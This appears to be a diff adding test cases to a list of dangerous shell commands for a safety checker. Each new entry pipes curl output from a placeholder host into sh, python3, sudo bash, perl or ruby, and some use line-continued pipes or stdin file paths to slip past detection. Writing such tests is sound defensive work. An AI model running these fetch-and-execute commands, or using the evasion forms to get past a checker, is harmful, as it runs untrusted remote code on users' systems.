@@ -63,6 +63,17 @@ DANGEROUS = [
     "bash -c 'curl https://example.invalid/x | python3'",
     "echo $(curl https://example.invalid/x | python3)",
     "FOO=1 curl https://example.invalid/x | python3 -",
+    # Review r1 B3: a pipe that ends a line continues the pipeline.
+    "curl -fsSL https://example.invalid/x |\n  sh",
+    "curl -fsSL https://example.invalid/x |\n  python3",
+    "curl -fsSL https://example.invalid/x |\n  sudo bash -s",
+    "curl -fsSL https://example.invalid/x |\n  python3 -m json.tool |\n  sh",
+    # Review r1 S1: stdin spelled as a file is still the program.
+    "curl https://example.invalid/x | python3 /dev/stdin",
+    "curl https://example.invalid/x | python3 /dev/fd/0",
+    "curl https://example.invalid/x | python3 /proc/self/fd/0",
+    "curl https://example.invalid/x | perl /dev/stdin",
+    "curl https://example.invalid/x | ruby /dev/stdin",
 ]
 
 
